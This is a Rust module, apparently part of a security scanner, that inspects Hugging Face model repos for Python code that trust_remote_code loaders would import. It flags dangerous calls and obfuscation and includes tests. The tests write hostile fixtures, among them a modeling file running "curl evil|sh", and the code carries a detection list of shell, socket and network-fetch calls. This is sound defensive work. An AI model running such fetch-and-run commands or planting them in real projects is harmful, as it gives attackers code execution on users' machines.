//! Remote code execution surface in a model repo.
//!
//! Weights cannot run code, but the files shipped next to them can. A Hugging
//! Face repo may carry `modeling_foo.py` plus an `auto_map` entry in
//! `config.json`; `from_pretrained(trust_remote_code=True)` then imports that
//! module, which executes everything at its top level. That is the most direct
//! execution path in the current ecosystem, and it is invisible to a scanner
//! that only looks at tensor containers.
//!
//! So we report the repo, not just the weights: every `.py` shipped alongside a
//! model becomes an artifact with its own verdict, and the config files are
//! read to find out which of them the loader would actually execute.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use serde_json::Value;

use crate::hash;
use crate::report::{ArtifactReport, Finding, Severity, Verdict};

/// Config files that can carry an `auto_map` (or an equivalent) pointing at
/// code in the repo.
const CONFIG_FILES: [&str; 7] = [
    "config.json",
    "tokenizer_config.json",
    "preprocessor_config.json",
    "processor_config.json",
    "feature_extractor_config.json",
    "image_processor_config.json",
    "model_index.json",
];

/// Cap per file so an enormous or generated module cannot flood the report.
const MAX_FINDINGS_PER_FILE: usize = 20;

/// Anything bigger than this is not read; we report its presence instead.
const MAX_PY_BYTES: u64 = 4 * 1024 * 1024;

/// One `role -> target` mapping found in a config file.
#[derive(Debug, Clone)]
struct AutoMapEntry {
    /// e.g. `AutoModelForCausalLM`.
    role: String,
    /// The raw target, e.g. `modeling_foo.MyModel` or `org/repo--mod.Class`.
    target: String,
    /// Which config file declared it.
    source: String,
}

impl AutoMapEntry {
    /// The repo-relative module a target refers to, when it is local.
    /// `modeling_foo.MyModel` -> `modeling_foo`.
    fn local_module(&self) -> Option<String> {
        if self.is_external() {
            return None;
        }
        let (module, _class) = self.target.rsplit_once('.')?;
        Some(module.to_string())
    }

    /// `org/repo--module.Class` means the code is fetched from *another* repo.
    fn is_external(&self) -> bool {
        self.target.contains("--")
    }
}

/// Analyze the repo around `root` for executable code shipped with the weights.
/// `root` may be a file (its directory is used) or a directory.
pub fn scan(root: &Path) -> Vec<ArtifactReport> {
    let base = if root.is_dir() {
        root.to_path_buf()
    } else {
        match root.parent() {
            Some(p) if !p.as_os_str().is_empty() => p.to_path_buf(),
            _ => PathBuf::from("."),
        }
    };

    let mut py_files = Vec::new();
    let mut config_files = Vec::new();
    collect(&base, &mut py_files, &mut config_files, 0);
    py_files.sort();
    config_files.sort();

    let entries: Vec<AutoMapEntry> = config_files
        .iter()
        .flat_map(|p| auto_map_entries(p))
        .collect();

    let mut reports = Vec::new();
    for py in &py_files {
        reports.push(analyze_python_file(py, &base, &entries));
    }
    reports.extend(unresolved_reports(&entries, &py_files, &base));
    reports
}

/// Walk the tree collecting python and config files. Bounded depth, because a
/// model repo is shallow and we refuse to chase a symlink maze.
fn collect(dir: &Path, py: &mut Vec<PathBuf>, cfg: &mut Vec<PathBuf>, depth: usize) {
    if depth > 4 {
        return;
    }
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    for entry in entries.flatten() {
        let p = entry.path();
        let file_type = match entry.file_type() {
            Ok(t) => t,
            Err(_) => continue,
        };
        if file_type.is_symlink() {
            continue; // never follow: a repo's own tree is what we judge
        }
        if file_type.is_dir() {
            collect(&p, py, cfg, depth + 1);
            continue;
        }
        let name = p
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if name.ends_with(".py") {
            py.push(p);
        } else if CONFIG_FILES.contains(&name.as_str()) {
            cfg.push(p);
        }
    }
}

/// Pull every `auto_map` / `custom_pipelines` mapping out of a config file.
fn auto_map_entries(path: &Path) -> Vec<AutoMapEntry> {
    let source = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("config")
        .to_string();
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(_) => return Vec::new(),
    };
    let json: Value = match serde_json::from_str(&text) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut out = Vec::new();
    for key in ["auto_map", "custom_pipelines"] {
        let Some(map) = json.get(key).and_then(|v| v.as_object()) else {
            continue;
        };
        for (role, target) in map {
            match target {
                // `auto_map` values are a string, or a list (slow/fast tokenizer).
                Value::String(s) => out.push(AutoMapEntry {
                    role: role.clone(),
                    target: s.clone(),
                    source: source.clone(),
                }),
                Value::Array(items) => {
                    for item in items.iter().filter_map(|v| v.as_str()) {
                        out.push(AutoMapEntry {
                            role: role.clone(),
                            target: item.to_string(),
                            source: source.clone(),
                        });
                    }
                }
                _ => {}
            }
        }
    }
    out
}

/// The `auto_map` entries that no local file satisfies, reported against the
/// config that declares them.
fn unresolved_reports(
    entries: &[AutoMapEntry],
    py_files: &[PathBuf],
    base: &Path,
) -> Vec<ArtifactReport> {
    let modules: Vec<String> = py_files
        .iter()
        .filter_map(|p| module_name(p, base))
        .collect();

    let mut by_config: BTreeMap<String, Vec<Finding>> = BTreeMap::new();
    let mut unresolved: BTreeMap<(String, String), Vec<AutoMapEntry>> = BTreeMap::new();
    for e in entries {
        if e.is_external() {
            let (repo, rest) = e.target.split_once("--").unwrap_or((&e.target, ""));
            by_config.entry(e.source.clone()).or_default().push(
                Finding::new(
                    "REMOTE_CODE_EXTERNAL",
                    Severity::High,
                    format!(
                        "{} maps {} to code in another repo ('{repo}'); loading with \
                         trust_remote_code=True downloads and executes code this repo \
                         does not even contain",
                        e.source, e.role
                    ),
                )
                .with_evidence(vec![
                    format!("{} -> {}", e.role, e.target),
                    format!("module in that repo: {rest}"),
                ]),
            );
            continue;
        }
        let Some(module) = e.local_module() else {
            continue;
        };
        if modules.contains(&module) {
            continue;
        }
        let key = (e.source.clone(), module.clone());
        unresolved.entry(key).or_default().push(e.clone());
    }

    for ((source, module), refs) in unresolved {
        let roles: Vec<String> = refs
            .iter()
            .map(|e| format!("{} -> {}", e.role, e.target))
            .collect();
        by_config.entry(source.clone()).or_default().push(
            Finding::new(
                "REMOTE_CODE_UNRESOLVED",
                Severity::Medium,
                format!(
                    "{source} maps {} loader entry point(s) to module '{module}', which is \
                     not in this repo; the loader will resolve it from somewhere else",
                    refs.len()
                ),
            )
            .with_evidence(roles),
        );
    }

    by_config
        .into_iter()
        .map(|(source, findings)| {
            let path = base.join(&source);
            let mut report = ArtifactReport::new(path.display().to_string(), "config");
            report.verdict = Verdict::Untrusted;
            if let Ok(bytes) = std::fs::read(&path) {
                report.hashes.file = Some(hash::tagged(&hash::blake3_hex(&bytes)));
            }
            for f in findings {
                report.push(f);
            }
            report
        })
        .collect()
}

/// The python module name a file provides, relative to the repo root.
fn module_name(path: &Path, base: &Path) -> Option<String> {
    let rel = path.strip_prefix(base).unwrap_or(path);
    let stem = rel.file_stem()?.to_str()?.to_string();
    Some(stem)
}

fn analyze_python_file(path: &Path, base: &Path, entries: &[AutoMapEntry]) -> ArtifactReport {
    let mut report = ArtifactReport::new(path.display().to_string(), "python");
    let module = module_name(path, base).unwrap_or_default();

    // Which loader entry points would execute this file.
    let referenced: Vec<&AutoMapEntry> = entries
        .iter()
        .filter(|e| e.local_module().as_deref() == Some(module.as_str()))
        .collect();

    let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
    let source = if size <= MAX_PY_BYTES {
        std::fs::read(path).ok()
    } else {
        None
    };
    if let Some(bytes) = &source {
        report.hashes.file = Some(hash::tagged(&hash::blake3_hex(bytes)));
    }

    if !referenced.is_empty() {
        let roles: Vec<String> = referenced
            .iter()
            .map(|e| format!("{} -> {}", e.role, e.target))
            .collect();
        let via = referenced[0].source.clone();
        report.push(
            Finding::new(
                "REMOTE_CODE_AUTO_MAP",
                Severity::High,
                format!(
                    "{via} routes {} loader entry point(s) to this file; \
                     from_pretrained(trust_remote_code=True) imports it, which runs \
                     everything at its top level before any weight is read",
                    referenced.len()
                ),
            )
            .with_evidence(roles),
        );
        report.verdict = Verdict::Untrusted;
    }

    let text = source
        .as_deref()
        .map(String::from_utf8_lossy)
        .map(|s| s.into_owned());

    match text {
        Some(text) => {
            let findings = scan_source(&text);
            let dangerous_at_import = findings
                .iter()
                .any(|f| f.severity >= Severity::High && f.id == "PY_DANGEROUS_CALL");
            for f in findings {
                report.push(f);
            }
            if dangerous_at_import {
                report.verdict = Verdict::Untrusted;
            }
        }
        None => {
            report.push(Finding::new(
                "PY_NOT_READ",
                Severity::Medium,
                format!("python file is {size} bytes, above the {MAX_PY_BYTES}-byte scan limit; not analyzed"),
            ));
        }
    }

    if report.findings.is_empty() {
        report.push(Finding::new(
            "REMOTE_CODE_PRESENT",
            Severity::Low,
            "executable python ships alongside the weights; nothing in this repo's \
             configs points a loader at it, but it is one import away from running",
        ));
    }
    report
}

/// Constructs worth reporting in code a loader may import, and what they are.
const DANGEROUS: &[(&str, &str)] = &[
    ("os.system(", "shell command execution"),
    ("os.popen(", "shell command execution"),
    ("os.execv", "process replacement"),
    ("os.spawn", "process spawn"),
    ("subprocess.", "subprocess execution"),
    ("pty.spawn(", "interactive shell spawn"),
    ("eval(", "dynamic code evaluation"),
    ("exec(", "dynamic code execution"),
    ("compile(", "dynamic code compilation"),
    ("__import__(", "dynamic import"),
    ("importlib.import_module(", "dynamic import"),
    ("pickle.loads(", "pickle deserialization"),
    ("marshal.loads(", "marshal deserialization"),
    ("base64.b64decode(", "encoded blob decoding"),
    ("codecs.decode(", "encoded blob decoding"),
    ("ctypes.", "native memory access"),
    ("socket.socket(", "raw network socket"),
    ("urllib.request.urlopen(", "network fetch"),
    ("urlopen(", "network fetch"),
    ("requests.get(", "network fetch"),
    ("requests.post(", "network upload"),
    ("httpx.", "network access"),
    ("setattr(builtins", "builtins patching"),
];

/// Scan python source for constructs that matter, with line numbers. Module
/// level is what runs on import, so it is scored higher than a function body.
fn scan_source(text: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let mut seen: Vec<(String, usize)> = Vec::new();
    let mut truncated = 0usize;

    for (i, raw) in text.lines().enumerate() {
        let line_no = i + 1;
        let trimmed = raw.trim_start();
        if trimmed.starts_with('#') || trimmed.is_empty() {
            continue;
        }
        let module_level = raw.len() == trimmed.len();

        for (needle, label) in DANGEROUS {
            if !is_call(trimmed, needle) {
                continue;
            }
            if seen.iter().any(|(n, l)| n == needle && *l == line_no) {
                continue;
            }
            seen.push((needle.to_string(), line_no));
            if findings.len() >= MAX_FINDINGS_PER_FILE {
                truncated += 1;
                continue;
            }
            let (severity, when) = if module_level {
                (
                    Severity::High,
                    "at module level, so it runs the moment the module is imported",
                )
            } else {
                (
                    Severity::Medium,
                    "inside a function body, so it runs when that function is called",
                )
            };
            findings.push(
                Finding::new(
                    "PY_DANGEROUS_CALL",
                    severity,
                    format!(
                        "{label} via {} {when}",
                        needle.trim_end_matches('(').trim_end_matches('.')
                    ),
                )
                .with_evidence(vec![format!("line {line_no}: {}", truncate(trimmed, 120))]),
            );
        }

        if let Some(kind) = obfuscation(trimmed) {
            if findings.len() < MAX_FINDINGS_PER_FILE {
                findings.push(
                    Finding::new(
                        "PY_OBFUSCATION",
                        Severity::Medium,
                        format!("{kind}, which is how a payload avoids being read"),
                    )
                    .with_evidence(vec![format!("line {line_no}: {}", truncate(trimmed, 120))]),
                );
            } else {
                truncated += 1;
            }
        }
    }

    if truncated > 0 {
        findings.push(Finding::new(
            "PY_DANGEROUS_CALL",
            Severity::High,
            format!("{truncated} further construct(s) not listed; this file is dense with them"),
        ));
    }
    findings
}

/// Does `line` really call `needle`, rather than merely end with those
/// characters? `model.eval()` and `torch.compile()` are ordinary torch code and
/// must not be read as `eval(` and `compile(`, so the character before the
/// match may not be part of an identifier or an attribute access.
fn is_call(line: &str, needle: &str) -> bool {
    let bytes = line.as_bytes();
    let mut from = 0usize;
    while let Some(rel) = line[from..].find(needle) {
        let at = from + rel;
        let ok = at == 0 || {
            let prev = bytes[at - 1];
            !(prev.is_ascii_alphanumeric() || prev == b'_' || prev == b'.')
        };
        if ok {
            return true;
        }
        from = at + 1;
    }
    false
}

/// Markers of deliberately unreadable code.
fn obfuscation(line: &str) -> Option<&'static str> {
    let escapes = line.matches("\\x").count();
    if escapes >= 12 {
        return Some("a long run of hex escapes");
    }
    for lit in line.split(['"', '\'']).skip(1).step_by(2) {
        if lit.len() >= 200
            && lit
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=')
        {
            return Some("a large encoded blob in a string literal");
        }
    }
    None
}

fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max).collect();
    out.push('…');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmpdir(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("assay-rc-{}-{}", tag, std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn write(dir: &Path, name: &str, text: &str) -> PathBuf {
        let p = dir.join(name);
        std::fs::write(&p, text).unwrap();
        p
    }

    fn weights(dir: &Path) {
        let header = r#"{"w":{"dtype":"U8","shape":[4],"data_offsets":[0,4]}}"#;
        let mut buf = (header.len() as u64).to_le_bytes().to_vec();
        buf.extend_from_slice(header.as_bytes());
        buf.extend_from_slice(&[1, 2, 3, 4]);
        std::fs::write(dir.join("model.safetensors"), buf).unwrap();
    }

    fn report_for<'a>(reports: &'a [ArtifactReport], name: &str) -> &'a ArtifactReport {
        reports
            .iter()
            .find(|r| r.artifact.ends_with(name))
            .unwrap_or_else(|| panic!("no report for {name} in {:?}", ids_of(reports)))
    }

    fn ids_of(reports: &[ArtifactReport]) -> Vec<&str> {
        reports.iter().map(|r| r.artifact.as_str()).collect()
    }

    fn finding_ids(r: &ArtifactReport) -> Vec<&str> {
        r.findings.iter().map(|f| f.id.as_str()).collect()
    }

    // --- auto_map parsing ---

    #[test]
    fn auto_map_is_read_in_both_string_and_list_form() {
        let dir = tmpdir("automap");
        let p = write(
            &dir,
            "config.json",
            r#"{"auto_map":{"AutoConfig":"configuration_x.C",
                            "AutoTokenizer":["tok_x.Slow","tok_x.Fast"]}}"#,
        );
        let e = auto_map_entries(&p);
        assert_eq!(e.len(), 3);
        assert!(e
            .iter()
            .any(|e| e.role == "AutoConfig" && e.target == "configuration_x.C"));
        assert_eq!(e.iter().filter(|e| e.role == "AutoTokenizer").count(), 2);
        assert!(e.iter().all(|e| e.source == "config.json"));
    }

    #[test]
    fn custom_pipelines_count_as_remote_code_too() {
        let dir = tmpdir("pipelines");
        let p = write(
            &dir,
            "config.json",
            r#"{"custom_pipelines":{"my-task":"pipeline_x.MyPipeline"}}"#,
        );
        assert_eq!(auto_map_entries(&p).len(), 1);
    }

    #[test]
    fn a_config_without_remote_code_yields_nothing() {
        let dir = tmpdir("plainconfig");
        let p = write(&dir, "config.json", r#"{"model_type":"gpt2","n_layer":12}"#);
        assert!(auto_map_entries(&p).is_empty());
        let bad = write(&dir, "tokenizer_config.json", "not json at all");
        assert!(auto_map_entries(&bad).is_empty());
    }

    #[test]
    fn a_cross_repo_target_is_recognized_as_external() {
        let local = AutoMapEntry {
            role: "AutoModel".into(),
            target: "modeling_x.Model".into(),
            source: "config.json".into(),
        };
        let external = AutoMapEntry {
            role: "AutoModel".into(),
            target: "other-org/other-repo--modeling_x.Model".into(),
            source: "config.json".into(),
        };
        assert!(!local.is_external());
        assert_eq!(local.local_module().as_deref(), Some("modeling_x"));
        assert!(external.is_external());
        assert_eq!(external.local_module(), None);
    }

    // --- source scanning ---

    #[test]
    fn ordinary_torch_code_is_not_a_payload() {
        // `model.eval()` and `torch.compile()` must not read as eval(/compile(.
        let src = "import torch\nm = torch.nn.Linear(2, 2)\nm.eval()\nm2 = torch.compile(m)\n";
        assert!(scan_source(src).is_empty(), "{:?}", scan_source(src));
    }

    #[test]
    fn a_bare_eval_is_still_caught() {
        let f = scan_source("eval(payload)\n");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn module_level_runs_on_import_and_scores_higher() {
        let src = "import os\nos.system('id')\n";
        let f = scan_source(src);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(f[0].detail.contains("os.system"), "{}", f[0].detail);
        assert!(f[0].detail.contains("imported"), "{}", f[0].detail);
        assert!(
            f[0].evidence[0].starts_with("line 2:"),
            "{:?}",
            f[0].evidence
        );
    }

    #[test]
    fn the_same_call_inside_a_function_is_reported_lower() {
        let src = "import os\ndef go():\n    os.system('id')\n";
        let f = scan_source(src);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Medium);
        assert!(f[0].detail.contains("called"), "{}", f[0].detail);
    }

    #[test]
    fn commented_out_code_is_not_a_finding() {
        assert!(scan_source("# os.system('id')\n#eval(x)\n").is_empty());
    }

    #[test]
    fn obfuscation_markers_are_reported() {
        let blob = "A".repeat(240);
        let f = scan_source(&format!("BLOB = \"{blob}\"\n"));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "PY_OBFUSCATION");

        let hex = "\\x41".repeat(14);
        let f = scan_source(&format!("X = \"{hex}\"\n"));
        assert!(f.iter().any(|f| f.id == "PY_OBFUSCATION"));
    }

    #[test]
    fn a_dense_payload_is_capped_with_a_summary() {
        let src = "os.system('id')\n".repeat(40);
        let f = scan_source(&src);
        assert_eq!(f.len(), MAX_FINDINGS_PER_FILE + 1);
        assert!(f.last().unwrap().detail.contains("further construct"));
    }

    // --- whole-repo behaviour ---

    #[test]
    fn a_repo_that_routes_the_loader_at_a_file_is_untrusted() {
        let dir = tmpdir("hostile");
        weights(&dir);
        write(
            &dir,
            "config.json",
            r#"{"auto_map":{"AutoModelForCausalLM":"modeling_evil.MyModel"}}"#,
        );
        write(
            &dir,
            "modeling_evil.py",
            "import os\nos.system('curl evil|sh')\n",
        );

        let reports = scan(&dir);
        let r = report_for(&reports, "modeling_evil.py");
        assert_eq!(r.format, "python");
        assert_eq!(r.verdict, Verdict::Untrusted);
        assert!(finding_ids(r).contains(&"REMOTE_CODE_AUTO_MAP"));
        assert!(finding_ids(r).contains(&"PY_DANGEROUS_CALL"));
        assert!(r.hashes.file.is_some(), "code must be pinnable too");
    }

    #[test]
    fn scanning_a_weights_file_still_sees_its_siblings() {
        let dir = tmpdir("sibling");
        weights(&dir);
        write(
            &dir,
            "config.json",
            r#"{"auto_map":{"AutoConfig":"configuration_x.C"}}"#,
        );
        write(&dir, "configuration_x.py", "class C:\n    pass\n");

        // The user pointed at one file, but the risk lives next to it.
        let reports = scan(&dir.join("model.safetensors"));
        let r = report_for(&reports, "configuration_x.py");
        assert!(finding_ids(r).contains(&"REMOTE_CODE_AUTO_MAP"));
    }

    #[test]
    fn code_nothing_points_at_is_reported_but_not_condemned() {
        let dir = tmpdir("unref");
        weights(&dir);
        write(&dir, "convert.py", "print('hello')\n");

        let reports = scan(&dir);
        let r = report_for(&reports, "convert.py");
        assert_eq!(r.verdict, Verdict::Clean);
        assert_eq!(finding_ids(r), vec!["REMOTE_CODE_PRESENT"]);
    }

    #[test]
    fn code_fetched_from_another_repo_is_flagged_on_the_config() {
        let dir = tmpdir("external");
        weights(&dir);
        write(
            &dir,
            "config.json",
            r#"{"auto_map":{"AutoModel":"sketchy/backdoored--modeling_x.Model"}}"#,
        );

        let reports = scan(&dir);
        let r = report_for(&reports, "config.json");
        assert_eq!(r.format, "config");
        assert_eq!(r.verdict, Verdict::Untrusted);
        let f = &r.findings[0];
        assert_eq!(f.id, "REMOTE_CODE_EXTERNAL");
        assert!(f.detail.contains("sketchy/backdoored"), "{}", f.detail);
    }

    #[test]
    fn a_mapping_with_no_local_file_is_reported_once_per_module() {
        let dir = tmpdir("unresolved");
        weights(&dir);
        write(
            &dir,
            "tokenizer_config.json",
            r#"{"auto_map":{"AutoTokenizer":["tok_x.Slow","tok_x.Fast"]}}"#,
        );

        let reports = scan(&dir);
        let r = report_for(&reports, "tokenizer_config.json");
        let f: Vec<_> = r
            .findings
            .iter()
            .filter(|f| f.id == "REMOTE_CODE_UNRESOLVED")
            .collect();
        assert_eq!(f.len(), 1, "both entries name one module");
        assert_eq!(f[0].evidence.len(), 2, "and both are listed as evidence");
    }

    #[test]
    fn a_plain_weights_repo_produces_no_extra_reports() {
        let dir = tmpdir("plain");
        weights(&dir);
        write(&dir, "config.json", r#"{"model_type":"gpt2"}"#);
        write(&dir, "tokenizer.json", "{}");
        assert!(scan(&dir).is_empty());
    }

    #[test]
    fn symlinked_code_is_not_followed() {
        let dir = tmpdir("symlink");
        weights(&dir);
        let outside = tmpdir("symlink-target");
        write(&outside, "evil.py", "import os\nos.system('id')\n");
        #[cfg(unix)]
        {
            let _ = std::os::unix::fs::symlink(outside.join("evil.py"), dir.join("evil.py"));
            assert!(
                scan(&dir).is_empty(),
                "a symlink out of the repo is not the repo"
            );
        }
    }
}
